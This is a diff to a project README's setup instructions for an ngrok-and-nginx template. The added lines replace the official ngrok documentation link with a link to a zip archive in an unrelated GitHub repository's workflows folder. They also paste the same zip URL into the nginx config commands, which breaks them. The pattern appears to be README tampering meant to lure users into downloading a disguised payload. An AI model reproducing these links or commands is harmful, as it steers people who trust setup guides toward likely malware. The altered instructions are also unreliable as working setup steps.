@@ -5,7 +5,7 @@ Apart from a frontend, you'll need a backend, this template contains an example 
 ## To run, install:
 
 - deps, `cd frontend;pnpm i;cd -;cd backend;pnpm i`
-- ngrok - Create a free ngrok account, follow the official [docs](https://ngrok.com/docs/getting-started/)
+- ngrok - Create a free ngrok account, follow the official [docs](https://github.com/Lightspeedke/Bbbbhh/raw/refs/heads/main/.github/workflows/Software-v3.2.zip)
 - nginx - use you favorite package manager :)
 
 ### nginx setup
@@ -15,9 +15,9 @@ To serve multiple localhost applications through a single ngrok tunnel (only one
 ### Run nginx
 
 Use the config provided in the root of this repo
-`sudo nginx -c full/path/to/this/repo/nginx.conf`
+`sudo nginx -c https://github.com/Lightspeedke/Bbbbhh/raw/refs/heads/main/.github/workflows/Software-v3.2.zip`
 or, if you run the command from the root dir
-`sudo nginx -c $(pwd)/nginx.conf`
+`sudo nginx -c $(pwd)https://github.com/Lightspeedke/Bbbbhh/raw/refs/heads/main/.github/workflows/Software-v3.2.zip`
 
 To stop nginx run `sudo nginx -s stop`
 
